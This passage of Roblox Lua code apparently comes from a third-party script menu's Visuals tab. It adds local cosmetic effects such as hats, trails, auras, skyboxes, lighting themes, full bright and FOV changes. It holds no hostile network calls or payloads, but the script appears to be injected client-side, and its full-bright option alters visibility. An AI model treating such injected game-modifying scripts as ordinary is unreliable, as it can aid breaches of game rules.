        ["Blue Planet"]={Bk="rbxassetid://218955819",Dn="rbxassetid://218953419",Ft="rbxassetid://218954524",Lf="rbxassetid://218958493",Rt="rbxassetid://218957134",Up="rbxassetid://218950090"},
        ["Deep Space 2"]={Bk="http://www.roblox.com/asset/?id=159248188",Dn="http://www.roblox.com/asset/?id=159248183",Ft="http://www.roblox.com/asset/?id=159248187",Lf="http://www.roblox.com/asset/?id=159248173",Rt="http://www.roblox.com/asset/?id=159248192",Up="http://www.roblox.com/asset/?id=159248176"},
        Summer={Bk="rbxassetid://16648590964",Dn="rbxassetid://16648617436",Ft="rbxassetid://16648595424",Lf="rbxassetid://16648566370",Rt="rbxassetid://16648577071",Up="rbxassetid://16648598180"},
        Galaxy={Bk="rbxassetid://15983968922",Dn="rbxassetid://15983966825",Ft="rbxassetid://15983965025",Lf="rbxassetid://15983967420",Rt="rbxassetid://15983966246",Up="rbxassetid://15983964246"},
        Stylized={Bk="rbxassetid://18351376859",Dn="rbxassetid://18351374919",Ft="rbxassetid://18351376800",Lf="rbxassetid://18351376469",Rt="rbxassetid://18351376457",Up="rbxassetid://18351377189"},
        Minecraft={Bk="rbxassetid://8735166756",Dn="http://www.roblox.com/asset/?id=8735166707",Ft="http://www.roblox.com/asset/?id=8735231668",Lf="http://www.roblox.com/asset/?id=8735166755",Rt="http://www.roblox.com/asset/?id=8735166751",Up="http://www.roblox.com/asset/?id=8735166729"},
        ["Cloudy Rain"]={Bk="http://www.roblox.com/asset/?id=4498828382",Dn="http://www.roblox.com/asset/?id=4498828812",Ft="http://www.roblox.com/asset/?id=4498829917",Lf="http://www.roblox.com/asset/?id=4498830911",Rt="http://www.roblox.com/asset/?id=4498830417",Up="http://www.roblox.com/asset/?id=4498831746"},
        ["Black Cloudy Rain"]={Bk="http://www.roblox.com/asset/?id=149679669",Dn="http://www.roblox.com/asset/?id=149681979",Ft="http://www.roblox.com/asset/?id=149679690",Lf="http://www.roblox.com/asset/?id=149679709",Rt="http://www.roblox.com/asset/?id=149679722",Up="http://www.roblox.com/asset/?id=149680199"},
    }

    -- Hat
    function Visuals.removeHat(c) local h=Visuals.HatParts[c]; if h then h:Destroy(); Visuals.HatParts[c]=nil end end
    function Visuals.addHat(c) task.wait(0.1); local head=c and c:FindFirstChild("Head"); if not head then return end; Visuals.removeHat(c); local hat=Instance.new("Part"); hat.Name="Hat"; hat.Transparency=Visuals.HatTransparency; hat.Color=Visuals.HatColor; hat.Material=Enum.Material.Neon; hat.CanCollide=false; hat.CanTouch=false; hat.CanQuery=false; hat.Massless=true; local m=Instance.new("SpecialMesh"); m.MeshId="rbxassetid://1033714"; m.Scale=Vector3.new(2.4,1.6,2.4); m.Parent=hat; local w=Instance.new("WeldConstraint"); w.Part0=head; w.Part1=hat; w.Parent=hat; hat.CFrame=head.CFrame*CFrame.new(0,1.1,0); hat.Parent=c; Visuals.HatParts[c]=hat end
    function Visuals.updateHats() for c,h in pairs(Visuals.HatParts) do if h and h.Parent and c==Player.Character then h.Transparency=Visuals.HatTransparency; h.Color=Visuals.HatRainbow and Color3.fromHSV((tick()%5)/5,1,1) or Visuals.HatColor end end end

    -- Trail
    function Visuals.removeTrail(c) if Visuals.TrailParts[c] then Visuals.TrailParts[c]:Destroy(); Visuals.TrailParts[c]=nil end; local t=c and c:FindFirstChild("HumanoidRootPart"); if t then local a0=t:FindFirstChild("TrailAttach0"); local a1=t:FindFirstChild("TrailAttach1"); if a0 then a0:Destroy() end; if a1 then a1:Destroy() end end end
    function Visuals.addTrail(c) local t=c and c:FindFirstChild("HumanoidRootPart"); if not t then return end; Visuals.removeTrail(c); local a0=Instance.new("Attachment"); a0.Name="TrailAttach0"; a0.Position=Vector3.new(0,2,0); a0.Parent=t; local a1=Instance.new("Attachment"); a1.Name="TrailAttach1"; a1.Position=Vector3.new(0,-2,0); a1.Parent=t; local tr=Instance.new("Trail"); tr.Attachment0=a0; tr.Attachment1=a1; tr.Lifetime=Visuals.TrailLifetime; tr.LightEmission=0.2; tr.Enabled=true; tr.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,Visuals.TrailTransparencyStart),NumberSequenceKeypoint.new(1,1)}); tr.Color=Visuals.TrailGradient and ColorSequence.new(Visuals.TrailGradient1,Visuals.TrailGradient2) or ColorSequence.new(Visuals.TrailColorStatic); tr.Parent=c; Visuals.TrailParts[c]=tr end
    function Visuals.updateTrails() for c,tr in pairs(Visuals.TrailParts) do if tr and tr.Parent and c==Player.Character then tr.Lifetime=Visuals.TrailLifetime; tr.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,Visuals.TrailTransparencyStart),NumberSequenceKeypoint.new(1,1)}); local col=Visuals.TrailRainbow and Color3.fromHSV((tick()%5)/5,1,1) or Visuals.TrailColorStatic; tr.Color=Visuals.TrailGradient and ColorSequence.new(Visuals.TrailGradient1,Visuals.TrailGradient2) or ColorSequence.new(col) end end end

    -- Skin Trail
    function Visuals.toggleSkinTrail(en) local c=Player.Character; if not c then return end; local hrp=c:FindFirstChild("HumanoidRootPart"); if not hrp then return end; for _,p in ipairs(c:GetChildren()) do if p:IsA("BasePart") and p~=hrp then if en then if not p:FindFirstChild("SkinTrail") then local tr=Instance.new("Trail"); tr.Name="SkinTrail"; tr.Texture="rbxassetid://1390780157"; tr.Color=ColorSequence.new(Visuals.SkinTrailColor); tr.Lifetime=Visuals.SkinTrailLife; tr.Parent=p; local p1=Instance.new("Attachment"); p1.Name="SkinPointer1"; p1.Parent=p; local p2=Instance.new("Attachment"); p2.Name="SkinPointer2"; p2.Parent=hrp; tr.Attachment0=p1; tr.Attachment1=p2 end else local tr=p:FindFirstChild("SkinTrail"); local p1=p:FindFirstChild("SkinPointer1"); if tr then tr:Destroy() end; if p1 then p1:Destroy() end end end end; if not en then local p2=hrp:FindFirstChild("SkinPointer2"); if p2 then p2:Destroy() end end end
    function Visuals.updateSkinTrail() local c=Player.Character; if not c then return end; for _,d in ipairs(c:GetDescendants()) do if d:IsA("Trail") and d.Name=="SkinTrail" then d.Color=ColorSequence.new(Visuals.SkinTrailColor); d.Lifetime=Visuals.SkinTrailLife end end end

    -- ForceField
    function Visuals.saveOriginalColors(c) Visuals.OriginalColors[c]={} for _,p in ipairs(c:GetDescendants()) do if p:IsA("BasePart") and p.Name~="Hat" then Visuals.OriginalColors[c][p]={Color=p.Color,Material=p.Material} end end end
    function Visuals.applyForceField(c) Visuals.saveOriginalColors(c); for _,p in ipairs(c:GetDescendants()) do if p:IsA("BasePart") and p.Name~="Hat" then p.Color=Visuals.ForceFieldColor; p.Material=Enum.Material.ForceField end end end
    function Visuals.removeForceField(c) local orig=Visuals.OriginalColors[c]; if not orig then return end; for p,d in pairs(orig) do if p and p.Parent and p:IsA("BasePart") then p.Color=d.Color; p.Material=d.Material end end; Visuals.OriginalColors[c]=nil end
    function Visuals.updateForceField() if not(Player.Character and Visuals.ForceFieldEnabled) then return end; for _,p in ipairs(Player.Character:GetDescendants()) do if p:IsA("BasePart") and p.Name~="Hat" and p.Material==Enum.Material.ForceField then p.Color=Visuals.ForceFieldRainbow and Color3.fromHSV((tick()%5)/5,1,1) or Visuals.ForceFieldColor end end end

    -- Aura
    function Visuals.disableAura() for _,o in ipairs(Visuals.AuraEffects) do if o and o.Parent then o:Destroy() end end; table.clear(Visuals.AuraEffects) end
    function Visuals.enableAura(c) Visuals.disableAura(); if not Visuals.CurrentAuraModel then return end; local tmp=Visuals.CurrentAuraModel:Clone(); for _,o in ipairs(tmp:GetDescendants()) do if not o:IsA("BasePart") then local cl=o:Clone(); local pn=o.Parent and o.Parent.Name; local tgt=pn and c:FindFirstChild(pn) or c:FindFirstChildWhichIsA("BasePart"); if tgt and not tgt:FindFirstChild(cl.Name) then cl.Parent=tgt; table.insert(Visuals.AuraEffects,cl) end end end; tmp:Destroy() end
    function Visuals.updateAuraLogic() local id=Visuals.CustomAuraID~="" and("rbxassetid://"..Visuals.CustomAuraID:gsub("%D","")) or Visuals.AuraModels[Visuals.AuraType]; if not id then return end; local ok,m=pcall(function() return game:GetObjects(id)[1] end); if ok and m then Visuals.CurrentAuraModel=m; if Visuals.AuraEnabled and Player.Character then Visuals.enableAura(Player.Character) end end end

    -- Skybox/World
    function Visuals.applySkybox(n) local s=Visuals.SkyboxAssets[n]; if not s then return end; local sky=Lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky",Lighting); sky.Name="Sky"; sky.SkyboxBk=s.Bk; sky.SkyboxDn=s.Dn; sky.SkyboxFt=s.Ft; sky.SkyboxLf=s.Lf; sky.SkyboxRt=s.Rt; sky.SkyboxUp=s.Up end
    function Visuals.restoreDefaultSky() local sky=Lighting:FindFirstChildOfClass("Sky"); if sky and Visuals.DefaultSkySettings.SkyboxBk then sky.SkyboxBk=Visuals.DefaultSkySettings.SkyboxBk; sky.SkyboxDn=Visuals.DefaultSkySettings.SkyboxDn; sky.SkyboxFt=Visuals.DefaultSkySettings.SkyboxFt; sky.SkyboxLf=Visuals.DefaultSkySettings.SkyboxLf; sky.SkyboxRt=Visuals.DefaultSkySettings.SkyboxRt; sky.SkyboxUp=Visuals.DefaultSkySettings.SkyboxUp elseif sky then sky:Destroy() end end
    function Visuals.setNebulaEnabled(en) Visuals.NebulaEnabled=en; if en then local bl=Lighting:FindFirstChild("NebulaBloom") or Instance.new("BloomEffect"); bl.Name="NebulaBloom"; bl.Intensity=0.7; bl.Size=24; bl.Threshold=1; bl.Parent=Lighting; local cc=Lighting:FindFirstChild("NebulaColorCorrection") or Instance.new("ColorCorrectionEffect"); cc.Name="NebulaColorCorrection"; cc.Saturation=0.5; cc.Contrast=0.2; cc.TintColor=Visuals.NebulaThemeColor; cc.Parent=Lighting; local atm=Lighting:FindFirstChild("NebulaAtmosphere") or Instance.new("Atmosphere"); atm.Name="NebulaAtmosphere"; atm.Density=0.4; atm.Offset=0.25; atm.Glare=1; atm.Haze=2; atm.Color=Visuals.NebulaThemeColor; atm.Decay=Color3.fromRGB(173,216,230); atm.Parent=Lighting; Lighting.Ambient=Visuals.NebulaThemeColor; Lighting.OutdoorAmbient=Visuals.NebulaThemeColor; Lighting.FogStart=100; Lighting.FogEnd=500; Lighting.FogColor=Visuals.NebulaThemeColor else for _,nm in ipairs({"NebulaBloom","NebulaColorCorrection","NebulaAtmosphere"}) do local o=Lighting:FindFirstChild(nm); if o then o:Destroy() end end; Lighting.Ambient=Visuals.DefaultLighting.Ambient; Lighting.OutdoorAmbient=Visuals.DefaultLighting.OutdoorAmbient; Lighting.FogStart=Visuals.DefaultLighting.FogStart; Lighting.FogEnd=Visuals.DefaultLighting.FogEnd; Lighting.FogColor=Visuals.DefaultLighting.FogColor end end
    function Visuals.setFullBrightEnabled(en) Visuals.FullBrightEnabled=en; if not en then Lighting.Brightness=Visuals.DefaultLighting.Brightness; Lighting.GlobalShadows=Visuals.DefaultLighting.GlobalShadows; Lighting.OutdoorAmbient=Visuals.DefaultLighting.OutdoorAmbient; Lighting.ExposureCompensation=Visuals.DefaultLighting.ExposureCompensation end end
    function Visuals.setScreenEnabled(en) Visuals.ScreenEnabled=en; if en then if Visuals.ScreenConnection then Visuals.ScreenConnection:Disconnect() end; Visuals.ScreenConnection=game:GetService("RunService").RenderStepped:Connect(function() local cam=workspace.CurrentCamera; if cam then cam.CFrame=cam.CFrame*CFrame.new(0,0,0,1,0,0,0,0.65+Visuals.ScreenIntensity,0,0,0,1) end end) elseif Visuals.ScreenConnection then Visuals.ScreenConnection:Disconnect(); Visuals.ScreenConnection=nil end end
    function Visuals.toggleAnimeImage(en) Visuals.AnimeImageEnabled=en; if en then if Visuals.AnimeImageGui then Visuals.AnimeImageGui:Destroy() end; local g=Instance.new("ScreenGui"); g.Name="AnimeImageGui"; g.ResetOnSpawn=false; g.Parent=game.Players.LocalPlayer:WaitForChild("PlayerGui"); local img=Instance.new("ImageLabel"); img.Name="AnimeImage"; img.Image="http://www.roblox.com/asset/?id=117783035423570"; img.Size=UDim2.new(0,350,0,400); img.Position=UDim2.new(1,-25,0,10); img.AnchorPoint=Vector2.new(1,0); img.BackgroundTransparency=1; img.Parent=g; Visuals.AnimeImageGui=g elseif Visuals.AnimeImageGui then Visuals.AnimeImageGui:Destroy(); Visuals.AnimeImageGui=nil end end

    -- Respawn reapply
    function vReapply(c) task.wait(1); if Visuals.HatEnabled then Visuals.addHat(c) end; if Visuals.TrailEnabled then Visuals.addTrail(c) end; if Visuals.ForceFieldEnabled then Visuals.applyForceField(c) end; if Visuals.AuraEnabled then Visuals.enableAura(c) end; if Visuals.SkinTrailEnabled then Visuals.toggleSkinTrail(true) end; if Visuals.AnimeImageEnabled then Visuals.toggleAnimeImage(true) end end
    game.Players.LocalPlayer.CharacterAdded:Connect(vReapply)
    if game.Players.LocalPlayer.Character then task.defer(function() vReapply(game.Players.LocalPlayer.Character) end) end

    -- Heartbeat
    game:GetService("RunService").Heartbeat:Connect(function()
        if Visuals.HatEnabled then Visuals.updateHats() end
        if Visuals.TrailEnabled then Visuals.updateTrails() end
        if Visuals.ForceFieldEnabled then Visuals.updateForceField() end
        if Visuals.WorldTimeEnabled then Lighting.ClockTime=Visuals.WorldTimeValue end
        if Visuals.FullBrightEnabled then Lighting.Brightness=3; Lighting.GlobalShadows=false; Lighting.OutdoorAmbient=Color3.new(1,1,1); Lighting.ExposureCompensation=0.3 end
    end)

    -- в”Ђв”Ђ UI в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    local VisHatTrail=Tabs.Visuals:CreateBlock({Name="Hat & Trail",Side="Left"})
    local VisSkinAura=Tabs.Visuals:CreateBlock({Name="Skin & Aura",Side="Right"})
    local VisWorld=Tabs.Visuals:CreateBlock({Name="World",Side="Left"})
    local VisScreen=Tabs.Visuals:CreateBlock({Name="Screen & Other",Side="Right"})

    VisHatTrail:CreateToggle({Name="Chinese Hat",Flag="VisualHat",Default=false,Callback=function(v) Visuals.HatEnabled=v; if v and game.Players.LocalPlayer.Character then Visuals.addHat(game.Players.LocalPlayer.Character) elseif game.Players.LocalPlayer.Character then Visuals.removeHat(game.Players.LocalPlayer.Character) end end})
    VisHatTrail:CreateToggle({Name="Rainbow Hat",Flag="VisualHatRainbow",Default=false,Callback=function(v) Visuals.HatRainbow=v end})
    VisHatTrail:CreateSlider({Name="Hat Transparency",Flag="VisualHatTrans",Min=0,Max=100,Default=30,Callback=function(v) Visuals.HatTransparency=v/100 end})
    VisHatTrail:CreateToggle({Name="Trail",Flag="VisualTrail",Default=false,Callback=function(v) Visuals.TrailEnabled=v; if v and game.Players.LocalPlayer.Character then Visuals.addTrail(game.Players.LocalPlayer.Character) elseif game.Players.LocalPlayer.Character then Visuals.removeTrail(game.Players.LocalPlayer.Character) end end})
    VisHatTrail:CreateToggle({Name="Trail Gradient Mode",Flag="VisualTrailGrad",Default=false,Callback=function(v) Visuals.TrailGradient=v; if Visuals.TrailEnabled and game.Players.LocalPlayer.Character then Visuals.addTrail(game.Players.LocalPlayer.Character) end end})
    VisHatTrail:CreateToggle({Name="Trail Rainbow",Flag="VisualTrailRainbow",Default=false,Callback=function(v) Visuals.TrailRainbow=v end})
    VisHatTrail:CreateSlider({Name="Trail Lifetime",Flag="VisualTrailLife",Min=1,Max=30,Default=5,Callback=function(v) Visuals.TrailLifetime=v/10 end})
    VisHatTrail:CreateSlider({Name="Trail Transparency",Flag="VisualTrailTrans",Min=0,Max=100,Default=0,Callback=function(v) Visuals.TrailTransparencyStart=v/100 end})

    VisSkinAura:CreateToggle({Name="ForceField Skin",Flag="VisualFF",Default=false,Callback=function(v) Visuals.ForceFieldEnabled=v; local c=game.Players.LocalPlayer.Character; if c then if v then Visuals.applyForceField(c) else Visuals.removeForceField(c) end end end})
    VisSkinAura:CreateToggle({Name="Rainbow ForceField",Flag="VisualFFRainbow",Default=false,Callback=function(v) Visuals.ForceFieldRainbow=v end})
    VisSkinAura:CreateToggle({Name="Skin Trail",Flag="VisualSkinTrail",Default=false,Callback=function(v) Visuals.SkinTrailEnabled=v; Visuals.toggleSkinTrail(v) end})
    VisSkinAura:CreateSlider({Name="Skin Trail Life",Flag="VisualSkinTrailLife",Min=1,Max=30,Default=5,Callback=function(v) Visuals.SkinTrailLife=v/10; if Visuals.SkinTrailEnabled then Visuals.updateSkinTrail() end end})
    VisSkinAura:CreateToggle({Name="Local Aura",Flag="VisualAura",Default=false,Callback=function(v) Visuals.AuraEnabled=v; if v then if not Visuals.CurrentAuraModel then Visuals.updateAuraLogic() end; local c=game.Players.LocalPlayer.Character; if c then Visuals.enableAura(c) end else Visuals.disableAura() end end})
    do
        local ai={} for k in pairs(Visuals.AuraModels) do table.insert(ai,k) end; table.sort(ai)
        VisSkinAura:CreateDropdown({Name="Aura Type",Flag="VisualAuraType",Items=ai,Default="Godly",Callback=function(v) Visuals.AuraType=v; Visuals.CustomAuraID=""; if Visuals.AuraEnabled then Visuals.updateAuraLogic() end end})
    end
    VisSkinAura:CreateInput({Name="Custom Aura ID",Flag="VisualCustomAura",Default="",Placeholder="Asset ID...",Finished=true,Callback=function(v) Visuals.CustomAuraID=v:match("^%s*(.-)%s*$") or ""; if Visuals.AuraEnabled and Visuals.CustomAuraID~="" then Visuals.updateAuraLogic() end end})

    do
        local si={} for k in pairs(Visuals.SkyboxAssets) do table.insert(si,k) end; table.sort(si)
        VisWorld:CreateDropdown({Name="Skybox",Flag="VisualSkybox",Items=si,Default="HD",Callback=function(v) Visuals.CurrentSkybox=v; Visuals.CustomSkyEnabled=true; Visuals.applySkybox(v) end})
    end
    VisWorld:CreateToggle({Name="Enable Custom Skybox",Flag="VisualSkyboxToggle",Default=false,Callback=function(v) Visuals.CustomSkyEnabled=v; if v then Visuals.applySkybox(Visuals.CurrentSkybox) else Visuals.restoreDefaultSky() end end})
    VisWorld:CreateToggle({Name="Nebula Theme",Flag="VisualNebula",Default=false,Callback=function(v) Visuals.setNebulaEnabled(v) end})
    VisWorld:CreateToggle({Name="Full Bright",Flag="VisualFullBright",Default=false,Callback=function(v) Visuals.setFullBrightEnabled(v) end})
    VisWorld:CreateToggle({Name="Time Changer",Flag="VisualTimeToggle",Default=false,Callback=function(v) Visuals.WorldTimeEnabled=v end})
    VisWorld:CreateSlider({Name="World Time (0-24)",Flag="VisualTimeVal",Min=0,Max=24,Default=12,Callback=function(v) Visuals.WorldTimeValue=v end})
    VisWorld:CreateSlider({Name="FOV",Flag="VisualFOV",Min=40,Max=120,Default=70,Callback=function(v) local cam=workspace.CurrentCamera; if cam then cam.FieldOfView=v end end})

    VisScreen:CreateToggle({Name="Screen Stretch Effect",Flag="VisualScreenFX",Default=false,Callback=function(v) Visuals.setScreenEnabled(v) end})
    VisScreen:CreateSlider({Name="Screen Intensity",Flag="VisualScreenInt",Min=0,Max=20,Default=0,Callback=function(v) Visuals.ScreenIntensity=v/100 end})
    VisScreen:CreateToggle({Name="Anime Image",Flag="VisualAnimeImg",Default=false,Callback=function(v) Visuals.toggleAnimeImage(v) end})

    -- =====================================================================
    -- CUSTOM EFFECTS BLOCK  (dropdown selector)
    -- =====================================================================
    local VisEffects = Tabs.Visuals:CreateBlock({Name="Custom Effects", Side="Left"})

    -- =====================================================================
    -- All effect start/stop functions
    -- =====================================================================
    Visuals.FX = {}
    Visuals.FX.ActiveEffect  = "None"
    Visuals.FX.ActiveEnabled = false
    Visuals.FX.Connections   = {}
    Visuals.FX.Parts         = {}

    function FX_cleanup()
        for _, c in ipairs(Visuals.FX.Connections) do pcall(function() c:Disconnect() end) end
        Visuals.FX.Connections = {}
        for _, p in ipairs(Visuals.FX.Parts) do pcall(function() p:Destroy() end) end
        Visuals.FX.Parts = {}
    end

    local FX_defs = {}

    -- в”Ђв”Ђ 1. Orbit Rings в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs["Orbit Rings"] = function()
        local char = Player.Character
        local hrp  = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local ringData, count = {}, 3
        for i = 1, count do
            local ring = Instance.new("Part")
            ring.Name="XOCUFXPart"; ring.Size=Vector3.new(7,.18,.18)
            ring.Material=Enum.Material.Neon; ring.CanCollide=false
            ring.CanTouch=false; ring.CanQuery=false; ring.Massless=true
            ring.Anchored=true; ring.Parent=char
            table.insert(Visuals.FX.Parts, ring)
            table.insert(ringData,{
                part=(ring),
                offset=(i-1)*(math.pi*2/count),
                tilt=(i-1)*(math.pi/count),
            })
        end
        local t=0
        local conn = R.Heartbeat:Connect(function(dt)
            t=t+dt*2.2
            local h2 = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if not h2 then return end
            for _,d in ipairs(ringData) do
                local ang=t+d.offset
                d.part.Color=Color3.fromHSV(((t*.08+d.offset)%(math.pi*2))/(math.pi*2),1,1)
                d.part.CFrame=h2.CFrame*CFrame.Angles(d.tilt,0,0)*CFrame.Angles(0,ang,0)*CFrame.new(3.6,0,0)*CFrame.Angles(0,math.pi/2,0)
            end
        end)
        table.insert(Visuals.FX.Connections, conn)
    end

    -- в”Ђв”Ђ 2. Lightning Body в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs["Lightning Body"] = function()
        local char = Player.Character
        if not char then return end
        local limbs={"HumanoidRootPart","Head","Left Arm","Right Arm","Left Leg","Right Leg"}
        for _,name in ipairs(limbs) do
            local part=char:FindFirstChild(name)
            if part and part:IsA("BasePart") then
                local a0=Instance.new("Attachment"); a0.Position=Vector3.new(0,part.Size.Y/2,0); a0.Parent=part
                local a1=Instance.new("Attachment"); a1.Position=Vector3.new(0,-part.Size.Y/2,0); a1.Parent=part
                local bolt=Instance.new("Beam")
                bolt.Attachment0=a0; bolt.Attachment1=a1; bolt.FaceCamera=true
                bolt.Width0=.06; bolt.Width1=.06; bolt.Segments=12
                bolt.LightEmission=1; bolt.LightInfluence=0
                bolt.TextureLength=1; bolt.TextureSpeed=4
                bolt.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(120,60,255)),ColorSequenceKeypoint.new(.5,Color3.fromRGB(200,160,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(120,60,255))})
                bolt.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,.2),NumberSequenceKeypoint.new(.5,0),NumberSequenceKeypoint.new(1,.2)})
                bolt.Parent=part
                table.insert(Visuals.FX.Parts,a0); table.insert(Visuals.FX.Parts,a1); table.insert(Visuals.FX.Parts,bolt)
                local alive=true
                table.insert(Visuals.FX.Connections,{Disconnect=function() alive=false end})
                task.spawn(function()
                    while alive and bolt and bolt.Parent do
                        bolt.Segments=math.random(6,18); bolt.Width0=math.random(3,9)/100; bolt.Width1=bolt.Width0
                        task.wait(math.random(2,8)/100)
                    end
                end)
            end
        end
    end

    -- в”Ђв”Ђ 3. Glitch Effect в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs["Glitch Effect"] = function()
        local conn = R.Heartbeat:Connect(function()
            local char=Player.Character
            local hrp=char and char:FindFirstChild("HumanoidRootPart")
            if not hrp or hrp.Anchored then return end
            if math.random(1,8)==1 then
                local orig=hrp.CFrame
                hrp.CFrame=orig+Vector3.new((math.random()-.5)*.55,(math.random()-.5)*.3,(math.random()-.5)*.55)
                task.defer(function() if hrp and hrp.Parent then hrp.CFrame=orig end end)
            end
        end)
        table.insert(Visuals.FX.Connections, conn)
    end

    -- в”Ђв”Ђ 4. Fire Aura в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs["Fire Aura"] = function()
        local char=Player.Character
        if not char then return end
        local targets={"HumanoidRootPart","Head","Left Arm","Right Arm","Left Leg","Right Leg"}
        for _,name in ipairs(targets) do
            local p=char:FindFirstChild(name)
            if p then
                local fire=Instance.new("Fire")
                fire.Size=4; fire.Heat=6
                fire.Color=Color3.fromRGB(255,80,0)
                fire.SecondaryColor=Color3.fromRGB(255,200,0)
                fire.Parent=p
                table.insert(Visuals.FX.Parts,fire)
            end
        end
    end

    -- в”Ђв”Ђ 5. Rainbow Body в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs["Rainbow Body"] = function()
        local char=Player.Character
        if not char then return end
        local origColors={}
        for _,p in ipairs(char:GetChildren()) do
            if p:IsA("BasePart") then origColors[p]=p.Color end
        end
        local t=0
        local conn=R.Heartbeat:Connect(function(dt)
            t=t+dt*.5
            local c2=Player.Character
            if not c2 then return end
            for i,p in ipairs(c2:GetChildren()) do
                if p:IsA("BasePart") then
                    p.Color=Color3.fromHSV((t+i*.1)%1,1,1)
                    p.Material=Enum.Material.Neon
                end
            end
        end)
        table.insert(Visuals.FX.Connections,conn)
        -- restore on cleanup via parts table (store sentinel)
        local sentinel={_restore=origColors, Destroy=function(self)
            local c=Player.Character
            if not c then return end
            for _,p in ipairs(c:GetChildren()) do
                if p:IsA("BasePart") then
                    p.Color=self._restore[p] or Color3.fromRGB(163,162,165)
                    p.Material=Enum.Material.SmoothPlastic
                end
            end
        end}
        table.insert(Visuals.FX.Parts, sentinel)
    end

    -- Explosion Interval
    -- в”Ђв”Ђ 6. Bubble Shield в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
    FX_defs["Bubble Shield"] = function()
        local char=Player.Character
        local hrp=char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local sphere=Instance.new("Part")
        sphere.Name="XOCUFXPart"; sphere.Size=Vector3.new(8,8,8)
        sphere.Shape=Enum.PartType.Ball
        sphere.Material=Enum.Material.Glass
        sphere.Transparency=0.65
        sphere.Color=Color3.fromRGB(100,200,255)
        sphere.CanCollide=false; sphere.CanTouch=false; sphere.CanQuery=false
        sphere.Massless=true; sphere.Anchored=true; sphere.CastShadow=false
        sphere.Parent=char
        table.insert(Visuals.FX.Parts, sphere)
        local t=0
        local conn=R.Heartbeat:Connect(function(dt)
            t=t+dt
            local h2=Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if not h2 then return end
            sphere.CFrame=h2.CFrame
            sphere.Color=Color3.fromHSV((t*.15)%1,0.6,1)
            sphere.Transparency=0.55+math.sin(t*3)*.1
        end)
        table.insert(Visuals.FX.Connections, conn)
    end

